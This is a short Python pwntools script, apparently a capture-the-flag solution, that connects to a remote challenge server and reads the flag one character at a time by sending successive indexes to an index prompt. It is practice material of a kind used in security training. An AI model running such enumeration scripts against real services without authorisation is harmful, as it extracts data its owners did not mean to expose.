from pwn import *

def get_flag():
    p = remote('94.237.48.12', 32936)
    flag = []
    idx = 0
    while True:
        p.sendlineafter(b'index: ', str(idx).encode()) 
        p.recvuntil(b': ')
        char = p.recv(1)
        flag.append(char.decode())
        idx += 1
        if char == b'}':
            break
    return ''.join(flag)

flag = get_flag()
print(flag)